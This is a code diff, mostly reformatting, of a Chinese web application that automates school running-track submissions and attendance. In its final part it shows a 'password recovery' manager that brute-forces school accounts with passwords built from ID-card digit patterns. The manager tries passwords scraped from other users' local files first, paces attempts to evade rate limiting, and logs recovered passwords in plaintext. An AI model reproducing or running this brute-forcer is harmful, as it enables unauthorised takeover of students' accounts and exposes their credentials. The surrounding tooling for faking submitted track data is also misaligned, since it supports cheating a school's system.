@@ -128,7 +128,7 @@ def import_standard_libraries():
         ("functools", "import functools"),
         ("ipaddress", "import ipaddress"),
         ("string", "import string"),
-        ("shutil", "import shutil")
+        ("shutil", "import shutil"),
     ]
 
     failed_imports = []
@@ -406,8 +406,6 @@ def initialize_global_variables():
 
     web_sessions = {}
     web_sessions_lock = threading.Lock()
-
-
 
     session_file_locks = {}
     session_file_locks_lock = threading.Lock()
@@ -981,15 +979,12 @@ def _get_default_config():
         # ICP备案号：由中国工信部颁发的互联网信息服务备案编号
         # 格式示例："京ICP备12345678号"，留空则表示未备案或不显示
         "icp_number": "",
-        
         # 是否显示ICP备案信息：控制ICP备案号是否在网站底部显示
         # 取值："true" 表示显示，"false" 表示不显示（默认不显示）
         "show_icp": "false",
-        
         # 公安网备案号：由中国公安部门颁发的网络安全备案编号
         # 格式示例："京公网安备 11010802012345号"，留空则表示未备案或不显示
         "police_number": "",
-        
         # 是否显示公安网备案信息：控制公安网备案号是否在网站底部显示
         # 取值："true" 表示显示，"false" 表示不显示（默认不显示）
         "show_police": "false",
@@ -1297,15 +1292,11 @@ def _write_config_with_comments(config_obj, filepath):
         f.write("# ICP备案号（工信部）\n")
         f.write("# 格式示例：京ICP备12345678号\n")
         f.write("# 留空则不显示（即使show_icp为true）\n")
-        f.write(
-            f"icp_number = {config_obj.get('Beian', 'icp_number', fallback='')}\n"
-        )
+        f.write(f"icp_number = {config_obj.get('Beian', 'icp_number', fallback='')}\n")
         f.write("# 是否在页面底部显示ICP备案信息（true/false）\n")
         f.write("# true：显示ICP备案号并链接至 http://beian.miit.gov.cn\n")
         f.write("# false：不显示ICP备案信息\n")
-        f.write(
-            f"show_icp = {config_obj.get('Beian', 'show_icp', fallback='false')}\n"
-        )
+        f.write(f"show_icp = {config_obj.get('Beian', 'show_icp', fallback='false')}\n")
         f.write("# 公安网备案号（公安部）\n")
         f.write("# 格式示例：京公网安备 11010802012345号\n")
         f.write("# 留空则不显示（即使show_police为true）\n")
@@ -1341,15 +1332,16 @@ def _create_config_ini():
             # [新增] 捕获所有解析错误（包括重复项、格式错误等），备份并重置
             print(f"\n[错误] 读取配置文件 '{config_file}' 失败: {e}")
             logging.error(f"配置文件读取失败: {e}")
-            
+
             import shutil
+
             backup_file = config_file + ".bak"
             try:
                 shutil.copy2(config_file, backup_file)
                 print(f"[配置文件] 已将损坏的配置文件备份为: {backup_file}")
             except Exception as copy_err:
                 print(f"[配置文件] 备份失败: {copy_err}")
-            
+
             print("[配置文件] 正在使用默认配置覆盖损坏的文件...")
             _write_config_with_comments(default_config, config_file)
             return
@@ -1770,7 +1762,7 @@ class AuthSystem:
     def _load_permissions(self):
         """加载权限配置（修复：增强的容错处理）"""
         logging.debug(f"_load_permissions: 检查权限文件: {PERMISSIONS_FILE}")
-        
+
         default_perms = {"permission_groups": {}, "user_groups": {}}
 
         # 如果文件不存在，直接创建默认并返回
@@ -1787,11 +1779,11 @@ class AuthSystem:
         try:
             with open(PERMISSIONS_FILE, "r", encoding="utf-8") as f:
                 content = f.read().strip()
-            
+
             # 检查内容是否为空（处理只有换行符的情况）
             if not content:
                 raise json.JSONDecodeError("文件内容为空", "", 0)
-                
+
             perms = json.loads(content)
             logging.debug(
                 f"_load_permissions: 权限配置已加载，权限组数: {len(perms.get('permission_groups', {}))}, 用户组数: {len(perms.get('user_groups', {}))}"
@@ -1799,20 +1791,20 @@ class AuthSystem:
             return perms
 
         except (json.JSONDecodeError, Exception) as e:
-            logging.error(f"_load_permissions: 读取权限文件异常 ({type(e).__name__}): {e}")
+            logging.error(
+                f"_load_permissions: 读取权限文件异常 ({type(e).__name__}): {e}"
+            )
             logging.warning("检测到权限文件损坏或格式错误，正在直接清空并重建...")
-            
+
             # 强制清空重建，不备份，不重命名
-            _create_permissions_json(force=True) 
-            
+            _create_permissions_json(force=True)
+
             # 重建后尝试重新读取新文件，确保内存数据与文件一致
             try:
                 with open(PERMISSIONS_FILE, "r", encoding="utf-8") as f:
                     return json.load(f)
             except Exception:
                 return default_perms
-            
-
 
     def _save_permissions(self):
         """保存权限配置"""
@@ -2833,27 +2825,31 @@ class AuthSystem:
             "session_ids": user_data.get("session_ids", []),
             "nickname": user_data.get("nickname", user_data["auth_username"]),
             "phone": user_data.get("phone", ""),
-            "last_used_school_account": user_data.get("last_used_school_account", ""), # 新增字段
+            "last_used_school_account": user_data.get(
+                "last_used_school_account", ""
+            ),  # 新增字段
         }
 
     def update_user_last_school_account(self, auth_username, school_username):
         """更新用户最后使用的学校账号"""
-        if not auth_username or auth_username == 'guest':
+        if not auth_username or auth_username == "guest":
             return
-        
+
         user_file = self.get_user_file_path(auth_username)
         if os.path.exists(user_file):
             with self.lock:
                 try:
                     with open(user_file, "r", encoding="utf-8") as f:
                         user_data = json.load(f)
-                    
+
                     user_data["last_used_school_account"] = school_username
-                    
+
                     with open(user_file, "w", encoding="utf-8") as f:
                         json.dump(user_data, f, indent=2, ensure_ascii=False)
                 except Exception as e:
-                    logging.error(f"更新用户 {auth_username} 的 last_used_school_account 失败: {e}")
+                    logging.error(
+                        f"更新用户 {auth_username} 的 last_used_school_account 失败: {e}"
+                    )
 
     def check_single_session_enforcement(self, auth_username, new_session_id):
         """检查并强制执行会话数量限制"""
@@ -3740,17 +3736,23 @@ class Api:
 
         # [优化] 将提交队列和线程池提升为类级别(Api._xxx)，实现全局单例
         # 避免每次实例化 Api (如读取配置时) 都重复创建 20 个线程
-        
+
         # 初始化类级别的锁，防止并发初始化冲突
         if not hasattr(Api, "_submission_init_lock"):
             Api._submission_init_lock = threading.Lock()
 
         with Api._submission_init_lock:
             # 1. 初始化类级别的队列和事件
-            if not hasattr(Api, "_static_submission_queue") or Api._static_submission_queue is None:
+            if (
+                not hasattr(Api, "_static_submission_queue")
+                or Api._static_submission_queue is None
+            ):
                 Api._static_submission_queue = queue.Queue()
-            
-            if not hasattr(Api, "_static_submission_stop") or Api._static_submission_stop is None:
+
+            if (
+                not hasattr(Api, "_static_submission_stop")
+                or Api._static_submission_stop is None
+            ):
                 Api._static_submission_stop = threading.Event()
 
             if not hasattr(Api, "_static_submission_threads"):
@@ -3762,12 +3764,14 @@ class Api:
             self._submission_worker_threads = Api._static_submission_threads
 
             # 3. 清理已死亡的线程
-            Api._static_submission_threads[:] = [t for t in Api._static_submission_threads if t.is_alive()]
-            
+            Api._static_submission_threads[:] = [
+                t for t in Api._static_submission_threads if t.is_alive()
+            ]
+
             # 4. 检查并补充线程 (全局只维护 20 个)
             MAX_SUBMISSION_CONCURRENCY = 20
             current_threads = len(Api._static_submission_threads)
-            
+
             if current_threads < MAX_SUBMISSION_CONCURRENCY:
                 threads_to_start = MAX_SUBMISSION_CONCURRENCY - current_threads
                 # 仅在确实需要启动新线程时才记录日志，避免刷屏
@@ -3775,13 +3779,18 @@ class Api:
                     for i in range(threads_to_start):
                         t = threading.Thread(
                             target=Api._submission_worker_static,  # [修正] 使用静态方法，不绑定self
-                            args=(Api._static_submission_queue, Api._static_submission_stop), # [修正] 显式传递参数
+                            args=(
+                                Api._static_submission_queue,
+                                Api._static_submission_stop,
+                            ),  # [修正] 显式传递参数
                             name=f"SubmissionWorker-{len(Api._static_submission_threads) + 1}",
                             daemon=True,
                         )
                         t.start()
                         Api._static_submission_threads.append(t)
-                    logging.info(f"已启动 {threads_to_start} 个数据提交工作线程 (全局池共 {len(Api._static_submission_threads)} 个)")
+                    logging.info(
+                        f"已启动 {threads_to_start} 个数据提交工作线程 (全局池共 {len(Api._static_submission_threads)} 个)"
+                    )
 
     def _init_state_variables(self):
         """初始化或重置应用的所有状态变量"""
@@ -4259,10 +4268,18 @@ class Api:
                 )
 
         # [修正] 不再将 LastUser 写入 config.ini，而是更新到系统账号文件
-        if hasattr(self, "auth_username") and self.auth_username and self.auth_username != "guest":
-            if 'auth_system' in globals():
-                auth_system.update_user_last_school_account(self.auth_username, username)
-                logging.debug(f"已更新用户 {self.auth_username} 的最后使用学校账号为: {username}")
+        if (
+            hasattr(self, "auth_username")
+            and self.auth_username
+            and self.auth_username != "guest"
+        ):
+            if "auth_system" in globals():
+                auth_system.update_user_last_school_account(
+                    self.auth_username, username
+                )
+                logging.debug(
+                    f"已更新用户 {self.auth_username} 的最后使用学校账号为: {username}"
+                )
 
         # 下面仅保留必要的全局配置写入（如 Map Key）
         if not main_cfg.has_section("Map"):
@@ -4321,7 +4338,7 @@ class Api:
             # [修正] auto_attendance_enabled 不再从全局配置文件读取，而是依赖会话持久化或默认值
             # 仅保留刷新间隔和半径作为全局默认值（如果需要的话），或者也完全移除
             # 这里根据指示移除 enabled 的读取
-            
+
             if cfg.has_option("Config", "auto_attendance_refresh_s"):
                 self.global_params["auto_attendance_refresh_s"] = cfg.getint(
                     "Config", "auto_attendance_refresh_s"
@@ -4476,7 +4493,7 @@ class Api:
     def get_initial_data(self, frontend_logs=None):
         """
         应用启动时由前端调用，获取初始用户列表和最后登录用户
-        
+
         参数:
             frontend_logs: 可选，前端发送的日志数据（列表或单个日志对象）
         """
@@ -4488,22 +4505,26 @@ class Api:
                 session_id = getattr(self, "_web_session_id", "UnknownSession")
                 auth_username = getattr(self, "auth_username", None)
                 is_guest = getattr(self, "is_guest", False)
-                
+
                 # 确定用户名
                 username = "Guest" if is_guest else (auth_username or "Unknown")
-                
+
                 # 处理日志列表
-                logs_to_process = frontend_logs if isinstance(frontend_logs, list) else [frontend_logs]
-                
+                logs_to_process = (
+                    frontend_logs
+                    if isinstance(frontend_logs, list)
+                    else [frontend_logs]
+                )
+
                 for log_item in logs_to_process:
                     if isinstance(log_item, dict) and log_item.get("message"):
                         level = log_item.get("level", "INFO").upper()
                         message = log_item.get("message", "")
                         timestamp = log_item.get("timestamp", "")
                         source = log_item.get("source", "unknown")
-                        
+
                         log_message = f"[前端日志][前端时间:{timestamp}][用户:{username}][Session:{session_id}][{source}] {message}"
-                        
+
                         # 根据日志级别记录到后端
                         if level == "ERROR":
                             logging.error(log_message)
@@ -4511,7 +4532,7 @@ class Api:
                             logging.warning(log_message)
                         else:
                             logging.info(log_message)
-                            
+
                 logging.debug(f"[前端日志] 处理了 {len(logs_to_process)} 条前端日志")
             except Exception as e:
                 logging.error(f"[前端日志] 处理前端日志时出错: {e}", exc_info=True)
@@ -4601,12 +4622,12 @@ class Api:
 
             # [修正] LastUser 不再从 config.ini 读取，而是从当前登录用户的系统账号信息中获取
             last_user = ""
-            
+
             # 尝试获取当前认证用户的 last_used_school_account
             auth_username = getattr(self, "auth_username", None)
             is_guest = getattr(self, "is_guest", False)
-            
-            if auth_username and not is_guest and 'auth_system' in globals():
+
+            if auth_username and not is_guest and "auth_system" in globals():
                 try:
                     details = auth_system.get_user_details(auth_username)
                     if details:
@@ -4674,13 +4695,15 @@ class Api:
             }
 
             # [新增] 如果是超级管理员，在初始化数据中包含密码恢复任务列表
-            if auth_group == 'super_admin':
+            if auth_group == "super_admin":
                 global brute_force_manager
                 if brute_force_manager:
-                    response_data["bruteforce_task_list"] = brute_force_manager.get_all_tasks_status()
+                    response_data["bruteforce_task_list"] = (
+                        brute_force_manager.get_all_tasks_status()
+                    )
                 else:
                     response_data["bruteforce_task_list"] = []
-            
+
             # [新增] 如果在多账号模式，添加所有账号的状态信息
             if getattr(self, "is_multi_account_mode", False):
                 try:
@@ -4690,7 +4713,9 @@ class Api:
                     if multi_status and isinstance(multi_status, dict):
                         # 添加accounts字段
                         response_data["accounts"] = multi_status.get("accounts", [])
-                        logging.debug(f"[多账号模式] 已添加 {len(response_data.get('accounts', []))} 个账号的状态信息")
+                        logging.debug(
+                            f"[多账号模式] 已添加 {len(response_data.get('accounts', []))} 个账号的状态信息"
+                        )
                 except Exception as e:
                     logging.error(f"[多账号模式] 获取账号状态失败: {e}", exc_info=True)
                     response_data["accounts"] = []
@@ -5436,9 +5461,7 @@ class Api:
             # 此时 coords 肯定为真且为列表，直接遍历
             for c in coords:
                 if not isinstance(c, dict):
-                    logging.warning(
-                        f"set_draft_path: 跳过无效的坐标点（非字典）: {c}"
-                    )
+                    logging.warning(f"set_draft_path: 跳过无效的坐标点（非字典）: {c}")
                     continue
 
                 lng = c.get("lng")
@@ -5451,7 +5474,7 @@ class Api:
                     continue
 
                 draft_coords_list.append((lng, lat, c.get("isKey", 0)))
-            
+
             # [新增] 二次校验：如果过滤后没有有效点，也视为失败
             if not draft_coords_list:
                 logging.warning("API调用: set_draft_path - 经校验后无有效坐标点")
@@ -5893,14 +5916,16 @@ class Api:
     @staticmethod
     def _submission_worker_static(submission_queue, stop_event):
         """后台工作线程：从队列取出提交任务并串行执行。(静态方法，防止绑定实例)"""
-        logging.debug("[SubmissionWorker] 提交队列工作线程已启动")  # [修正] 改为DEBUG级别，防止启动时刷屏
-        
+        logging.debug(
+            "[SubmissionWorker] 提交队列工作线程已启动"
+        )  # [修正] 改为DEBUG级别，防止启动时刷屏
+
         while not stop_event.is_set():
             try:
                 # 1. 获取任务
                 try:
                     task = submission_queue.get(timeout=1.0)
-                except queue.Empty: # 使用 queue.Empty 捕获超时
+                except queue.Empty:  # 使用 queue.Empty 捕获超时
                     continue
                 except Exception as e:
                     logging.warning(f"[SubmissionWorker] 队列获取异常: {e}")
@@ -5910,19 +5935,24 @@ class Api:
                 # 2. 执行任务
                 try:
                     # logging.debug("[SubmissionWorker] 正在处理一个提交任务...") # 减少日志噪音
-                    
+
                     client = task.get("client")
                     payload_str = task.get("payload")
-                    
+
                     if client and payload_str:
                         resp = client.submit_run_track(payload_str)
                         task["response"] = resp
                         # logging.debug(f"[SubmissionWorker] 提交完成: {bool(resp and resp.get('success'))}")
                     else:
-                        task["response"] = {"success": False, "message": "Invalid task data"}
+                        task["response"] = {
+                            "success": False,
+                            "message": "Invalid task data",
+                        }
 
                 except Exception as e:
-                    logging.error(f"[SubmissionWorker] 任务执行内部错误: {e}", exc_info=True)
+                    logging.error(
+                        f"[SubmissionWorker] 任务执行内部错误: {e}", exc_info=True
+                    )
                     task["response"] = None
                 finally:
                     # 3. 通知完成
@@ -5935,13 +5965,16 @@ class Api:
                         submission_queue.task_done()
                     except Exception:
                         pass
-                
+
                 # 避免CPU空转，虽有队列阻塞，但保留微小延时更稳健
                 time.sleep(0.01)
 
             except Exception as outer_e:
-                logging.critical(f"[SubmissionWorker] 线程主循环发生未捕获异常: {outer_e}", exc_info=True)
-                time.sleep(5) # 出错后冷却，防止死循环刷日志
+                logging.critical(
+                    f"[SubmissionWorker] 线程主循环发生未捕获异常: {outer_e}",
+                    exc_info=True,
+                )
+                time.sleep(5)  # 出错后冷却，防止死循环刷日志
 
     def _enqueue_submission(
         self, client: ApiClient, payload_str: str, wait_timeout: float = 30.0
@@ -6915,7 +6948,9 @@ class Api:
         if session_id:
             try:
                 save_session_state(session_id, self, force_save=True)
-                logging.info(f"[持久化] 已保存清除路径后的会话状态: {session_id[:8]}...")
+                logging.info(
+                    f"[持久化] 已保存清除路径后的会话状态: {session_id[:8]}..."
+                )
             except Exception as e:
                 logging.error(f"[持久化] 保存会话状态失败: {e}")
 
@@ -7428,8 +7463,12 @@ class Api:
                 )
                 if not login_resp or not login_resp.get("success"):
                     # 获取实际的错误信息，而不是假设密码错误
-                    fail_msg = login_resp.get("message", "未知错误") if login_resp else "网络请求无响应"
-                    
+                    fail_msg = (
+                        login_resp.get("message", "未知错误")
+                        if login_resp
+                        else "网络请求无响应"
+                    )
+
                     if not acc.is_first_login_verified:
                         acc.is_verifying = False
                         acc.is_first_login_verified = False
@@ -8359,7 +8398,7 @@ class Api:
                 "expired": expired,
                 # 新增返回值
                 "unexpired_count": unexpired_count,
-                "unexpired_incomplete_count": unexpired_incomplete_count
+                "unexpired_incomplete_count": unexpired_incomplete_count,
             }
         )
 
@@ -9968,6 +10007,8 @@ def monitor_session_inactivity():
                 sessions_snapshot = list(web_sessions.items())
 
             for session_id, api_instance in sessions_snapshot:
+                if not session_id or session_id == "null" or session_id.strip() == "" or session_id == "undefined":
+                    continue
                 if not api_instance:
                     continue
                 with session_activity_lock:
@@ -12751,8 +12792,6 @@ def save_ssl_config(ssl_config):
         return False
 
 
-
-
 # ============================================================================
 # 密码恢复（暴力破解）功能的后端实现
 # 警告：此功能仅用于合法的学校账号密码恢复
@@ -12766,53 +12805,53 @@ brute_force_manager = None
 class BruteForceTaskManager:
     """
     密码恢复任务管理器
-    
+
     功能：
     - 管理多个账号的密码恢复任务
     - 每个任务独立运行在后台线程中
     - 支持启动、停止、查询任务状态
     - 自动保存任务状态和恢复结果
     """
-    
+
     # 类常量：账号不存在的错误关键词
     ACCOUNT_NOT_EXIST_KEYWORDS = ["不存在", "未找到", "无效", "not found", "invalid"]
-    
+
     # 类常量：尝试密码间隔时间（秒）
     PASSWORD_ATTEMPT_DELAY = 0.5
 
     def __init__(self, logs_dir):
         """
         初始化任务管理器
-        
+
         参数：
             logs_dir (str): 日志目录路径，用于存储任务数据文件
         """
         # 存储所有任务的字典，键为账号，值为任务信息
         self.tasks = {}
-        
+
         # 线程锁：用于保护tasks字典的并发访问
         self.lock = threading.Lock()
-        
+
         # 日志目录路径
         self.logs_dir = logs_dir
-        
+
         # 已尝试密码的文件路径
         self.attempts_file = os.path.join(logs_dir, "brute_force_attempts.json")
-        
+
         # 破解结果的文件路径
         self.results_file = os.path.join(logs_dir, "brute_force_results.json")
-        
+
         # 确保日志目录存在
         if not os.path.exists(logs_dir):
             os.makedirs(logs_dir)
-        
+
         # 加载已存在的尝试记录和结果
         self.attempts = self._load_json_file(self.attempts_file, {})
         self.results = self._load_json_file(self.results_file, {})
 
         # [修正] 任务列表持久化文件路径
         self.tasks_file = os.path.join(logs_dir, "brute_force_tasks.json")
-        
+
         # [修正] 加载任务列表，并处理重启后的僵尸状态
         self.tasks = self._load_json_file(self.tasks_file, {})
         for acc, task_info in self.tasks.items():
@@ -12822,17 +12861,17 @@ class BruteForceTaskManager:
         # 保存修正后的状态
         if self.tasks:
             self._save_json_file(self.tasks_file, self.tasks)
-        
+
         logging.info("[密码恢复] 任务管理器初始化完成")
 
     def _load_json_file(self, filepath, default=None):
         """
         从JSON文件加载数据
-        
+
         参数：
             filepath (str): 文件路径
             default: 如果文件不存在或加载失败时返回的默认值
-        
+
         返回值：
             加载的数据或默认值
         """
@@ -12845,14 +12884,14 @@ class BruteForceTaskManager:
         except Exception as e:
             # 加载失败时记录错误
             logging.error(f"[密码恢复] 加载文件失败 {filepath}: {e}")
-        
+
         # 返回默认值
         return default if default is not None else {}
 
     def _save_json_file(self, filepath, data):
         """
         将数据保存到JSON文件
-        
+
         参数：
             filepath (str): 文件路径
             data: 要保存的数据（必须可JSON序列化）
@@ -12868,30 +12907,30 @@ class BruteForceTaskManager:
     def generate_passwords(self, account):
         """
         密码生成器：根据身份证后六位规则生成密码
-        
+
         参数：
             account (str): 账号
-        
+
         生成策略：
         根据中国身份证号码后六位规则生成：
         - 第1-2位: 出生日期的日(01-31)
         - 第3-4位: 顺序码(00-99)，由当地派出所按顺序分配
         - 第5位: 性别码(0-9)，偶数为女性，奇数为男性
         - 第6位: 校验码(0-9, X, x)，X可能是大写或小写
-        
+
         总共可能的密码组合：31 * 100 * 10 * 12 = 372,000个
         跳过已经尝试过的密码
-        
+
         返回值：
             生成器，每次yield一个密码字符串
         """
         # 获取该账号已尝试过的密码集合
         attempted = set(self.attempts.get(account, []))
-        
+
         # 第6位校验码的可能值：0-9和X（大写和小写）
         # 使用列表推导式生成0-9，然后添加X和x
-        check_codes = [str(i) for i in range(10)] + ['X', 'x']
-        
+        check_codes = [str(i) for i in range(10)] + ["X", "x"]
+
         # 遍历所有可能的组合
         for day in range(1, 32):  # 第1-2位：日期01-31
             for seq in range(100):  # 第3-4位：顺序码00-99
@@ -12899,7 +12938,7 @@ class BruteForceTaskManager:
                     for check in check_codes:  # 第6位：校验码0-9,X,x
                         # 组合成6位密码：日期(2位) + 顺序码(2位) + 性别(1位) + 校验(1位)
                         password = f"{day:02d}{seq:02d}{gender}{check}"
-                        
+
                         # 如果该密码未被尝试过，则yield返回
                         if password not in attempted:
                             yield password
@@ -12909,18 +12948,18 @@ class BruteForceTaskManager:
         从本地配置文件中查找该账号可能存在的密码
         """
         found_pwds = set()
-        
+
         # 1. 扫描 user_accounts 目录 (JSON格式: 系统用户 -> 学校账号映射)
         # 使用 AuthSystem 的方法读取，避免重复造轮子
         ua_dir = os.path.join(SCHOOL_ACCOUNTS_DIR, "user_accounts")
-        if os.path.exists(ua_dir) and 'auth_system' in globals():
+        if os.path.exists(ua_dir) and "auth_system" in globals():
             try:
                 for fname in os.listdir(ua_dir):
                     if fname.endswith(".json"):
                         auth_username = os.path.splitext(fname)[0]
                         # 使用已有的 auth_system 方法加载账户信息，更健壮
                         accounts = auth_system._load_user_school_accounts(auth_username)
-                        
+
                         if accounts and target_account in accounts:
                             val = accounts[target_account]
                             pwd = ""
@@ -12937,11 +12976,13 @@ class BruteForceTaskManager:
         if os.path.exists(ini_path):
             try:
                 # 简单文本解析以避免 ConfigParser 的复杂性
-                with open(ini_path, 'r', encoding='utf-8', errors='ignore') as f:
+                with open(ini_path, "r", encoding="utf-8", errors="ignore") as f:
                     for line in f:
                         line = line.strip()
                         # 匹配 Password = xxx 或 密码 = xxx
-                        if line.lower().startswith("password") or line.startswith("密码"):
+                        if line.lower().startswith("password") or line.startswith(
+                            "密码"
+                        ):
                             parts = line.split("=", 1)
                             if len(parts) == 2:
                                 pwd = parts[1].strip()
@@ -12951,19 +12992,20 @@ class BruteForceTaskManager:
             except Exception as e:
                 logging.warning(f"[密码恢复] 读取INI失败: {e}")
 
-        if(len(found_pwds) > 0):
-            logging.info(f"[密码恢复] 在本地配置文件中为账号 {target_account} 发现可能的密码: {found_pwds}")
+        if len(found_pwds) > 0:
+            logging.info(
+                f"[密码恢复] 在本地配置文件中为账号 {target_account} 发现可能的密码: {found_pwds}"
+            )
 
         return list(found_pwds)
-
 
     def start_task(self, account):
         """
         启动账号的密码恢复任务
-        
+
         参数：
             account (str): 要恢复密码的账号
-        
+
         返回值：
             dict: {"success": True/False, "message": "..."}
         """
@@ -12972,7 +13014,7 @@ class BruteForceTaskManager:
             # 检查该账号是否已有任务在运行
             if account in self.tasks and self.tasks[account].get("status") == "running":
                 return {"success": False, "message": f"账号 {account} 的任务已在运行中"}
-            
+
             # 创建新任务的状态信息
             task_info = {
                 "account": account,  # 账号
@@ -12983,17 +13025,17 @@ class BruteForceTaskManager:
                 "end_time": None,  # 结束时间（初始为None）
                 "stop_flag": False,  # 停止标志（用于通知线程停止）
             }
-            
+
             # 将任务添加到tasks字典
             self.tasks[account] = task_info
 
             # [修正] 持久化任务列表
             self._save_json_file(self.tasks_file, self.tasks)
-            
+
             # 如果该账号没有尝试记录，创建空列表
             if account not in self.attempts:
                 self.attempts[account] = []
-        
+
         # 创建后台线程执行密码破解
         thread = threading.Thread(
             target=self._run_brute_force,
@@ -13001,19 +13043,19 @@ class BruteForceTaskManager:
             daemon=True,  # 守护线程，主程序退出时自动终止
         )
         thread.start()
-        
+
         # 记录任务启动日志
         logging.info(f"[密码恢复] 已启动账号 {account} 的密码恢复任务")
-        
+
         return {"success": True, "message": f"已启动账号 {account} 的任务"}
 
     def _run_brute_force(self, account):
         """
         执行密码破解的后台线程函数
-        
+
         参数：
             account (str): 账号
-        
+
         执行流程：
         1. 创建临时ApiClient用于登录验证
         2. 遍历密码生成器生成的密码
@@ -13026,27 +13068,29 @@ class BruteForceTaskManager:
             # 创建临时的Api实例用于登录测试
             # 注意：为了避免影响现有会话，创建独立的Api对象
             # 注意：不需要临时目录，ApiClient不依赖文件系统
-            
+
             # 创建一个简单的临时对象来模拟Api需要的属性
             class TempApp:
                 def __init__(self):
                     self.device_ua = ApiClient.generate_random_ua()
                     self.log = lambda msg: logging.debug(f"[密码恢复临时登录] {msg}")
                     # [修复] 补充缺失属性，防止 ApiClient._request 报错
-                    self.is_offline_mode = False 
-                    self.api_bridge = None # ApiClient 会先检查 is_offline_mode，有了上面这行通常不需要 api_bridge，但为了保险起见设为 None 或 self
-            
+                    self.is_offline_mode = False
+                    self.api_bridge = None  # ApiClient 会先检查 is_offline_mode，有了上面这行通常不需要 api_bridge，但为了保险起见设为 None 或 self
+
             temp_app = TempApp()
             api_client = ApiClient(temp_app)
-            
+
             # 记录开始尝试
             logging.info(f"[密码恢复] 开始尝试账号 {account} 的密码恢复")
-            
+
             # === 修改开始：优先尝试本地密码 ===
             # 1. 获取本地已知密码
             local_passwords = self._find_local_passwords(account)
             if local_passwords:
-                logging.info(f"[密码恢复] 在本地配置文件中找到 {len(local_passwords)} 个历史密码，将优先尝试")
+                logging.info(
+                    f"[密码恢复] 在本地配置文件中找到 {len(local_passwords)} 个历史密码，将优先尝试"
+                )
 
             # 2. 获取算法生成器
             algo_gen = self.generate_passwords(account)
@@ -13062,7 +13106,7 @@ class BruteForceTaskManager:
 
             password_gen = combined_password_generator()
             # === 修改结束 ===
-            
+
             # 遍历每个密码
             for password in password_gen:
                 # 检查是否收到停止信号
@@ -13070,34 +13114,45 @@ class BruteForceTaskManager:
                     if self.tasks[account].get("stop_flag"):
                         logging.info(f"[密码恢复] 账号 {account} 的任务收到停止信号")
                         self.tasks[account]["status"] = "stopped"
-                        self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                        self.tasks[account][
+                            "end_time"
+                        ] = datetime.datetime.now().isoformat()
                         self._save_json_file(self.results_file, self.results)
                         # [修正] 持久化任务状态更新
                         self._save_json_file(self.tasks_file, self.tasks)
                         return
-                
+
                 # 尝试使用该密码登录学校系统
                 # 使用ApiClient.login方法进行登录验证
                 try:
                     resp = api_client.login(account, password)
-                    
+
                     # 检查登录是否成功
                     if resp and resp.get("success"):
                         # 登录成功！找到密码
                         success = True
-                        logging.info(f"[密码恢复] 账号 {account} 登录成功，密码为: {password}")
+                        logging.info(
+                            f"[密码恢复] 账号 {account} 登录成功，密码为: {password}"
+                        )
                     else:
                         # 登录失败
                         success = False
                         error_msg = resp.get("message", "") if resp else ""
-                        
+
                         # 检查是否是"账号不存在"的错误
                         # 使用类常量中定义的关键词列表
-                        if any(keyword in error_msg for keyword in self.ACCOUNT_NOT_EXIST_KEYWORDS):
-                            logging.warning(f"[密码恢复] 账号 {account} 不存在，停止任务")
+                        if any(
+                            keyword in error_msg
+                            for keyword in self.ACCOUNT_NOT_EXIST_KEYWORDS
+                        ):
+                            logging.warning(
+                                f"[密码恢复] 账号 {account} 不存在，停止任务"
+                            )
                             with self.lock:
                                 self.tasks[account]["status"] = "failed"
-                                self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                                self.tasks[account][
+                                    "end_time"
+                                ] = datetime.datetime.now().isoformat()
                                 # [修正] 持久化任务状态更新
                                 self._save_json_file(self.tasks_file, self.tasks)
 
@@ -13107,34 +13162,40 @@ class BruteForceTaskManager:
                                     "attempts": self.tasks[account]["attempts"],
                                     "start_time": self.tasks[account]["start_time"],
                                     "end_time": self.tasks[account]["end_time"],
-                                    "error": "账号不存在"
+                                    "error": "账号不存在",
                                 }
                                 self._save_json_file(self.results_file, self.results)
                             return
-                
+
                 except Exception as e:
                     # 登录请求异常，继续尝试下一个密码
-                    logging.debug(f"[密码恢复] 账号 {account} 尝试密码 {password} 时出现异常: {e}")
+                    logging.debug(
+                        f"[密码恢复] 账号 {account} 尝试密码 {password} 时出现异常: {e}"
+                    )
                     success = False
-                
+
                 # 更新已尝试密码数
                 with self.lock:
                     self.tasks[account]["attempts"] += 1
                     self.attempts[account].append(password)
-                    
+
                     # 每尝试100个密码保存一次
                     if self.tasks[account]["attempts"] % 100 == 0:
                         self._save_json_file(self.attempts_file, self.attempts)
-                        logging.info(f"[密码恢复] 账号 {account} 已尝试 {self.tasks[account]['attempts']} 个密码")
-                
+                        logging.info(
+                            f"[密码恢复] 账号 {account} 已尝试 {self.tasks[account]['attempts']} 个密码"
+                        )
+
                 # 如果登录成功
                 if success:
                     with self.lock:
                         # 更新任务状态
                         self.tasks[account]["status"] = "success"
                         self.tasks[account]["password"] = password
-                        self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
-                        
+                        self.tasks[account][
+                            "end_time"
+                        ] = datetime.datetime.now().isoformat()
+
                         # [修正] 持久化任务状态更新
                         self._save_json_file(self.tasks_file, self.tasks)
 
@@ -13147,19 +13208,19 @@ class BruteForceTaskManager:
                             "end_time": self.tasks[account]["end_time"],
                         }
                         self._save_json_file(self.results_file, self.results)
-                    
+
                     logging.info(f"[密码恢复] 账号 {account} 的密码已找到: {password}")
                     return
-                
+
                 # 添加短暂延迟，避免请求过快触发防护
                 # 使用类常量定义的延迟时间
                 time.sleep(self.PASSWORD_ATTEMPT_DELAY)
-            
+
             # 所有密码都尝试完毕，未找到
             with self.lock:
                 self.tasks[account]["status"] = "failed"
                 self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
-                
+
                 # [修正] 持久化任务状态更新
                 self._save_json_file(self.tasks_file, self.tasks)
 
@@ -13172,12 +13233,14 @@ class BruteForceTaskManager:
                     "end_time": self.tasks[account]["end_time"],
                 }
                 self._save_json_file(self.results_file, self.results)
-            
+
             logging.info(f"[密码恢复] 账号 {account} 的任务完成，未找到密码")
-        
+
         except Exception as e:
             # 捕获异常，记录错误并更新任务状态
-            logging.error(f"[密码恢复] 账号 {account} 的任务执行失败: {e}", exc_info=True)
+            logging.error(
+                f"[密码恢复] 账号 {account} 的任务执行失败: {e}", exc_info=True
+            )
             with self.lock:
                 self.tasks[account]["status"] = "failed"
                 self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
@@ -13187,10 +13250,10 @@ class BruteForceTaskManager:
     def stop_task(self, account):
         """
         停止指定账号的密码恢复任务
-        
+
         参数：
             account (str): 账号
-        
+
